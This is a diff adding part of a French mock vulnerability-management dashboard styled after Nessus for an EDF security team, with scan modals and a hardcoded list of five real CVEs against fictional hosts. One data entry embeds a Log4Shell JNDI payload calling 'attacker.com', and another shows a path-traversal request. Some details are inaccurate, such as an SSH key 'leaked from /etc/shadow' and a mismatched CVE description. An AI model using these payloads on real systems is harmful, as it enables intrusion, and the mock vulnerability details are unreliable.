+                    <p class="text-xs text-slate-500">Réseau d'agents Nessus distribués sur les sites industriels et datacenters EDF</p>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 font-mono text-xs">
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+                        <div class="flex justify-between items-center">
+                            <strong class="text-slate-900">Scanner-Saclay-01 (Internal)</strong>
+                            <span class="bg-emerald-100 text-emerald-800 text-[10px] font-bold px-2 py-0.5 rounded">ONLINE</span>
+                        </div>
+                        <div class="text-slate-600 text-[11px]">IP: 10.200.4.15 • CPU: 12% • RAM: 4.2GB</div>
+                        <div class="text-slate-500 text-[11px]">Charge Tâches: 2 Scans en file d'attente</div>
+                    </div>
+
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+                        <div class="flex justify-between items-center">
+                            <strong class="text-slate-900">Scanner-OT-Bugey (Zone OT)</strong>
+                            <span class="bg-emerald-100 text-emerald-800 text-[10px] font-bold px-2 py-0.5 rounded">ONLINE</span>
+                        </div>
+                        <div class="text-slate-600 text-[11px]">IP: 10.142.8.2 • Mode: Passive NNM</div>
+                        <div class="text-slate-500 text-[11px]">Supervision Industrielle Continue Modbus/IEC</div>
+                    </div>
+
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-2">
+                        <div class="flex justify-between items-center">
+                            <strong class="text-slate-900">Scanner-Harbor-K8s (Cluster)</strong>
+                            <span class="bg-emerald-100 text-emerald-800 text-[10px] font-bold px-2 py-0.5 rounded">ONLINE</span>
+                        </div>
+                        <div class="text-slate-600 text-[11px]">Plugin: Container Security Engine</div>
+                        <div class="text-slate-500 text-[11px]">Audit automatique à chaque Push Docker</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- 4. MODALS & DIALOGS -->
+
+    <!-- MODAL A: LAUNCH NEW SCAN DIALOG -->
+    <div id="modal-launch-scan" class="fixed inset-0 bg-slate-900/70 backdrop-blur-xs z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl border border-slate-300 p-6 max-w-lg w-full shadow-2xl space-y-5">
+            <div class="flex items-center justify-between border-b border-slate-200 pb-3">
+                <div class="flex items-center gap-2.5">
+                    <div class="p-2 bg-sky-100 rounded-lg text-tenable-accent">
+                        <i data-lucide="play-circle" class="w-6 h-6"></i>
+                    </div>
+                    <h3 class="font-extrabold text-slate-900 text-base">Lancer un Nouveau Scan Nessus</h3>
+                </div>
+                <button onclick="closeLaunchScanModal()" class="text-slate-400 hover:text-slate-600">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <div class="space-y-4 text-xs font-sans">
+                <div>
+                    <label class="block font-bold text-slate-700 mb-1">Nom de la Tâche de Scan</label>
+                    <input type="text" id="scan-name-input" value="Scan d'Infrastructure Ad-hoc - EDF SOC" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-slate-800 font-mono focus:outline-none focus:border-tenable-accent">
+                </div>
+
+                <div>
+                    <label class="block font-bold text-slate-700 mb-1">Modèle de Scan Nessus (Template)</label>
+                    <select id="scan-template-select" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-slate-800 focus:outline-none focus:border-tenable-accent font-medium">
+                        <option value="infra">Full Infrastructure Network Sweep (Périmètre IT/OT)</option>
+                        <option value="container">K8s & Docker Container Image Audit (Harbor Registry)</option>
+                        <option value="scada">OT/SCADA Protocol Vulnerability Audit (IEC-60870 / Modbus)</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block font-bold text-slate-700 mb-1">Cible IP ou Plage CIDR</label>
+                    <input type="text" id="scan-target-input" value="10.142.8.0/24, 10.200.4.0/24" class="w-full bg-slate-50 border border-slate-300 rounded-lg px-3 py-2 text-slate-800 font-mono focus:outline-none focus:border-tenable-accent">
+                </div>
+            </div>
+
+            <div class="flex justify-end gap-3 pt-3 border-t border-slate-200">
+                <button onclick="closeLaunchScanModal()" class="px-4 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-lg">
+                    Annuler
+                </button>
+                <button onclick="confirmLaunchScan()" class="px-5 py-2 bg-tenable-accent hover:bg-sky-600 text-white font-bold text-xs rounded-lg shadow-md flex items-center gap-1.5">
+                    <i data-lucide="play" class="w-4 h-4"></i>
+                    <span>Démarrer la Tâche</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL B: VULNERABILITY DETAIL DRILL-DOWN -->
+    <div id="modal-vuln-detail" class="fixed inset-0 bg-slate-900/70 backdrop-blur-xs z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-xl border border-slate-300 p-6 max-w-3xl w-full shadow-2xl space-y-5 max-h-[90vh] overflow-y-auto">
+            <div class="flex items-center justify-between border-b border-slate-200 pb-3">
+                <div class="flex items-center gap-3">
+                    <span id="modal-vuln-severity-badge" class="bg-red-100 text-red-800 font-bold text-xs px-2.5 py-1 rounded-lg border border-red-300">
+                        CRITICAL
+                    </span>
+                    <div>
+                        <h3 class="font-extrabold text-slate-900 text-base font-mono" id="modal-vuln-title">CVE-2024-24919 - Check Point Security Gateway RCE</h3>
+                        <p class="text-xs text-slate-500 font-mono" id="modal-vuln-plugin">Nessus Plugin ID: 194821</p>
+                    </div>
+                </div>
+                <button onclick="closeVulnModal()" class="text-slate-400 hover:text-slate-600">
+                    <i data-lucide="x" class="w-5 h-5"></i>
+                </button>
+            </div>
+
+            <!-- VPR & CVSS Metrics Box -->
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono text-xs">
+                <div class="bg-slate-50 p-3 rounded-lg border border-slate-200">
+                    <span class="text-slate-500 text-[10px] block">VPR SCORE (TENABLE):</span>
+                    <strong class="text-red-600 text-base" id="modal-vpr-score">9.8 / 10</strong>
+                </div>
+                <div class="bg-slate-50 p-3 rounded-lg border border-slate-200">
+                    <span class="text-slate-500 text-[10px] block">CVSS v3.1 BASE:</span>
+                    <strong class="text-red-600 text-base" id="modal-cvss-score">9.8 (CRITICAL)</strong>
+                </div>
+                <div class="bg-slate-50 p-3 rounded-lg border border-slate-200">
+                    <span class="text-slate-500 text-[10px] block">EXPLOIT EN COURS:</span>
+                    <strong class="text-red-700 text-base" id="modal-exploit-status">OUI (PNS/In-the-Wild)</strong>
+                </div>
+                <div class="bg-slate-50 p-3 rounded-lg border border-slate-200">
+                    <span class="text-slate-500 text-[10px] block">VECTEUR:</span>
+                    <strong class="text-slate-800 text-base" id="modal-vector">NETWORK (AV:N)</strong>
+                </div>
+            </div>
+
+            <!-- Description & Affected Asset -->
+            <div class="space-y-2 text-xs">
+                <h4 class="font-bold text-slate-800 uppercase font-mono">Hôte Équipement EDF Impacté:</h4>
+                <div class="p-3 bg-slate-100 rounded-lg font-mono text-slate-800 border border-slate-200" id="modal-affected-host">
+                    10.142.8.45 (Gateway SCADA Substation Lyon-04)
+                </div>
+
+                <h4 class="font-bold text-slate-800 uppercase font-mono pt-2">Description de la Vulnérabilité:</h4>
+                <p class="text-slate-600 leading-relaxed font-sans" id="modal-vuln-description">
+                    Une vulnérabilité de divulgation d'informations sensibles ou de traversée d'arborescence permet à un attaquant non authentifié d'accéder à des fichiers système confidentiels sur les passerelles réseau.
+                </p>
+
+                <h4 class="font-bold text-slate-800 uppercase font-mono pt-2">Sortie Brute du Plugin Nessus (Plugin Output):</h4>
+                <pre class="bg-slate-900 text-emerald-400 p-3.5 rounded-lg text-[11px] font-mono overflow-x-auto" id="modal-raw-output">
+HTTP GET /clients/MyVPN HTTP/1.1
+Host: 10.142.8.45
+Response 200 OK: Sensitive SSH private key leaked from /etc/shadow or /config/db
+Nessus Plugin 194821 verified exploitability on target.
+                </pre>
+
+                <h4 class="font-bold text-slate-800 uppercase font-mono pt-2">Recommandation & Correctif SOC EDF:</h4>
+                <div class="p-3 bg-emerald-50 border border-emerald-200 rounded-lg text-emerald-900 font-sans" id="modal-solution">
+                    Appliquer la mise à jour Hotfix du constructeur immédiatement ou isoler la passerelle dans le VLAN de confinement OT.
+                </div>
+            </div>
+
+            <div class="flex justify-end gap-3 pt-3 border-t border-slate-200">
+                <button onclick="closeVulnModal()" class="px-5 py-2 bg-slate-800 text-white font-bold text-xs rounded-lg">
+                    Fermer
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TOAST NOTIFICATION CONTAINER -->
+    <div id="toast-container" class="fixed bottom-5 right-5 z-50 space-y-2 pointer-events-none"></div>
+
+    <!-- 5. JAVASCRIPT LOGIC -->
+    <script>
+        // Real Vulnerability Dataset
+        let vulnerabilitiesData = [
+            {
+                id: 'VULN-01',
+                pluginId: '194821',
+                title: 'Check Point Security Gateway Arbitrary File Read',
+                cve: 'CVE-2024-24919',
+                severity: 'CRITICAL',
+                vpr: '9.8',
+                cvss: '9.8',
+                host: '10.142.8.45 (Gateway SCADA Substation 04)',
+                exploit: 'Oui (In the Wild)',
+                vector: 'Network (AV:N/AC:L)',
+                desc: 'Traversée d\'arborescence réseau permettant à un attaquant externe non authentifié de lire des clés de chiffrement et fichiers système critiques sur les passerelles VPN de téléconduite.',
+                raw: 'GET /clients/MyVPN HTTP/1.1\nHost: 10.142.8.45\nResponse: 200 OK [Sensitive Root Password Hash Exposed]',
+                solution: 'Appliquer immédiatement le Hotfix CheckPoint EPS-2024 ou isoler la passerelle du réseau WAN.'
+            },
+            {
+                id: 'VULN-02',
+                pluginId: '156014',
+                title: 'Apache Log4j RCE (Log4Shell Remote Code Execution)',
+                cve: 'CVE-2021-44228',
+                severity: 'CRITICAL',
+                vpr: '10.0',
+                cvss: '10.0',
+                host: '10.200.12.8 (Legacy SCADA Bridge Server)',
+                exploit: 'Oui (Metasploit Available)',
+                vector: 'Network (AV:N/AC:L)',
+                desc: 'Exécution de code à distance non authentifiée via la désérialisation de requêtes JNDI malveillantes dans le logger Java Log4j.',
+                raw: 'JNDI Lookup detected in User-Agent header: ${jndi:ldap://attacker.com/a}\nTarget backend executed arbitrary payload.',
+                solution: 'Mettre à jour log4j-core vers la version 2.17.1 ou définir log4j2.formatMsgNoLookups=true.'
+            },
+            {
+                id: 'VULN-03',
+                pluginId: '180291',
+                title: 'Linux Kernel Privilege Escalation in OpenShift Node',
+                cve: 'CVE-2023-38606',
+                severity: 'CRITICAL',
+                vpr: '9.4',
+                cvss: '8.8',
+                host: 'k8s-node-03.prod.edf.internal',
+                exploit: 'Oui (PoC)',
+                vector: 'Local (AV:L/AC:L)',
+                desc: 'Élévation de privilèges locale permettant à un conteneur compromis de sortir de sa sandbox Kubernetes et d\'obtenir l\'accès root sur le nœud hyperviseur.',
+                raw: 'Kernel v5.14.0-284 vulnerabilities detected in overlayfs driver.',
+                solution: 'Patcher le nœud OpenShift vers RedHat Enterprise Linux CoreOS v4.13.12.'
+            },
+            {
+                id: 'VULN-04',
+                pluginId: '172044',
+                title: 'OpenSSH Remote Code Execution (regreSSHion)',
+                cve: 'CVE-2024-6387',
+                severity: 'HIGH',
+                vpr: '8.1',
+                cvss: '8.1',
+                host: '10.142.9.12 (Hydro Turbine Monitoring Node)',
+                exploit: 'Oui (Proof-of-Concept)',
+                vector: 'Network (AV:N/AC:H)',
+                desc: 'Condition de concurrence (Signal Handler Race Condition) dans le serveur OpenSSH glibc permettant une exécution de code avec privilèges root.',
+                raw: 'OpenSSH_8.9p1 Ubuntu-3ubuntu0.1 detected. Signal handler race condition present.',
+                solution: 'Mettre à jour OpenSSH vers la version 9.8p1 ou positionner LoginGraceTime 0 dans sshd_config.'
+            },
+            {
+                id: 'VULN-05',
+                pluginId: '161102',
+                title: 'Outdated Nginx Base Image in K8s Registry',
+                cve: 'CVE-2023-44487',
+                severity: 'HIGH',
+                vpr: '7.5',
+                cvss: '7.5',
+                host: 'edf-registry.internal/grid-control/relay-service:v2.4',
+                exploit: 'Oui (HTTP/2 Rapid Reset)',
+                vector: 'Network (AV:N/AC:L)',
+                desc: 'Attaque par déni de service (Rapid Reset HTTP/2) provoquant la saturation CPU des conteneurs d\'ingestion.',
+                raw: 'Image layer sha256:8291f contains Nginx 1.22.0 susceptible to HTTP/2 stream flooding.',
+                solution: 'Recompiler l\'image de conteneur en utilisant nginx:1.25.3-alpine comme image de base.'
+            }
+        ];
+
+        // Tab Navigation Switcher
+        function switchTab(tabId) {
+            ['dashboard', 'vulnerabilities', 'containers', 'scans'].forEach(t => {
+                const view = document.getElementById(`view-${t}`);
+                const btn = document.getElementById(`tab-${t}`);
+                if (t === tabId) {
+                    view.classList.remove('hidden');
+                    btn.className = "px-3.5 py-2 rounded-lg text-xs font-bold transition-all bg-tenable-accent text-white flex items-center gap-2 shadow-xs";
+                } else {
+                    view.classList.add('hidden');
+                    btn.className = "px-3.5 py-2 rounded-lg text-xs font-bold transition-all text-slate-600 hover:text-tenable-accent hover:bg-slate-100 flex items-center gap-2";
+                }
+            });
+        }
+
+        // Render Active Vulnerabilities Table
+        function renderVulnTable(filter = 'ALL') {
+            const tbody = document.getElementById('vuln-table-body');
+            tbody.innerHTML = '';
+
+            vulnerabilitiesData.forEach(vuln => {
+                if (filter !== 'ALL' && vuln.severity !== filter) return;
+
+                let sevBadge = 'bg-slate-100 text-slate-800';
+                if (vuln.severity === 'CRITICAL') sevBadge = 'bg-red-100 text-red-800 border border-red-300 font-extrabold';
+                if (vuln.severity === 'HIGH') sevBadge = 'bg-orange-100 text-orange-800 border border-orange-300 font-extrabold';
+
+                const tr = document.createElement('tr');
+                tr.className = "hover:bg-slate-50 transition-colors";
+                tr.innerHTML = `
+                    <td class="p-3"><span class="px-2 py-0.5 rounded text-[10px] ${sevBadge}">${vuln.severity}</span></td>
+                    <td class="p-3 font-sans">
+                        <strong class="text-slate-900 block text-xs">${vuln.title}</strong>
+                        <span class="text-[11px] text-slate-500 font-mono">Plugin ID: ${vuln.pluginId}</span>
+                    </td>
+                    <td class="p-3 font-bold text-tenable-accent">${vuln.cve}</td>
+                    <td class="p-3 font-bold text-red-600">${vuln.vpr}</td>
+                    <td class="p-3 text-slate-700">${vuln.cvss}</td>
+                    <td class="p-3 text-slate-600">${vuln.host}</td>
+                    <td class="p-3 text-right font-sans">
+                        <button onclick="openVulnDetails('${vuln.id}')" class="bg-tenable-navy hover:bg-slate-700 text-white font-bold text-[11px] px-2.5 py-1 rounded transition-all">
+                            Détails & Fix
+                        </button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function filterVulns(sev) {
+            ['all', 'critical', 'high'].forEach(s => {
+                const btn = document.getElementById(`btn-vuln-${s}`);
+                if (s === sev.toLowerCase()) {
+                    btn.className = "px-2.5 py-1 rounded-lg bg-tenable-navy text-white font-bold";
+                } else {
+                    btn.className = "px-2.5 py-1 rounded-lg bg-slate-200 hover:bg-slate-300 text-slate-800 font-bold";
+                }
+            });
+            renderVulnTable(sev);
+        }
+
+        // Open Detail Modal for Vulnerability
+        function openVulnDetails(vulnId) {
+            const vuln = vulnerabilitiesData.find(v => v.id === vulnId);
+            if (!vuln) return;
+
+            document.getElementById('modal-vuln-title').textContent = `${vuln.cve} - ${vuln.title}`;
+            document.getElementById('modal-vuln-plugin').textContent = `Nessus Plugin ID: ${vuln.pluginId}`;
+            document.getElementById('modal-vpr-score').textContent = `${vuln.vpr} / 10`;
+            document.getElementById('modal-cvss-score').textContent = `${vuln.cvss} (${vuln.severity})`;
+            document.getElementById('modal-exploit-status').textContent = vuln.exploit;
+            document.getElementById('modal-vector').textContent = vuln.vector;
+            document.getElementById('modal-affected-host').textContent = vuln.host;
+            document.getElementById('modal-vuln-description').textContent = vuln.desc;
+            document.getElementById('modal-raw-output').textContent = vuln.raw;
+            document.getElementById('modal-solution').textContent = vuln.solution;
+
+            document.getElementById('modal-vuln-detail').classList.remove('hidden');
+        }
+
+        function closeVulnModal() {
+            document.getElementById('modal-vuln-detail').classList.add('hidden');
+        }
+
+        // Scan Launch Modal
+        function openLaunchScanModal() {
+            document.getElementById('modal-launch-scan').classList.remove('hidden');
+        }
+
+        function closeLaunchScanModal() {
+            document.getElementById('modal-launch-scan').classList.add('hidden');
+        }
+
+        function confirmLaunchScan() {
+            const name = document.getElementById('scan-name-input').value;
+            closeLaunchScanModal();
+            showToast('Tâche de Scan Démarrée', `Scan "${name}" envoyé aux scanners Nessus Saclay & OT`, 'success');
+        }
+
+        // Filter / Search Bar Filter
+        function handleGlobalSearch(query) {
+            const q = query.toLowerCase();
+            const filtered = vulnerabilitiesData.filter(v => 
+                v.title.toLowerCase().includes(q) || 
+                v.cve.toLowerCase().includes(q) || 
+                v.host.toLowerCase().includes(q)
+            );
+            
+            if (query.trim().length > 0) {
+                switchTab('vulnerabilities');
+            }
+        }
+
+        function openContainerDetails(imgId) {
+            showToast('Inspection d\'Image Docker', 'Analyse statique des couches de l\'image K8s ouverte', 'info');
+        }
+
+        function openScanDetails(scanId) {
+            showToast('Logs de Scan Nessus', 'Chargement du flux d\'événements réseau en direct', 'info');
+        }
+
+        function exportScanReport() {
+            showToast('Export Rapport Nessus', 'Rapport de vulnérabilités synthétique généré en CSV/PDF', 'success');
+        }
+
+        function switchScope(scope) {
+            showToast('Changement de Périmètre', `Filtre actif mis à jour: Scope ${scope.toUpperCase()}`, 'info');
+        }
+
+        // Toast Engine
+        function showToast(title, msg, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+
+            let colorBorder = 'border-tenable-accent';
+            if (type === 'danger') colorBorder = 'border-red-600';
+            if (type === 'success') colorBorder = 'border-emerald-500';
+
+            toast.className = `pointer-events-auto bg-white border-l-4 ${colorBorder} border border-slate-200 text-slate-800 p-3.5 rounded-xl shadow-2xl space-y-1 max-w-sm font-sans text-xs flex items-start gap-3`;
+            toast.innerHTML = `
+                <div class="p-1.5 rounded-lg bg-sky-100 text-tenable-accent shrink-0">
+                    <i data-lucide="shield-check" class="w-4 h-4"></i>
+                </div>
+                <div>
+                    <div class="font-bold text-slate-900">${title}</div>
+                    <div class="text-slate-600">${msg}</div>
+                </div>
+            `;
+            container.appendChild(toast);
+            lucide.createIcons();
+
+            setTimeout(() => { toast.remove(); }, 4000);
+        }
+
+        // Init App
+        window.onload = function() {
+            lucide.createIcons();
+            renderVulnTable();
+        };
+    </script>
+</body>
+</html>
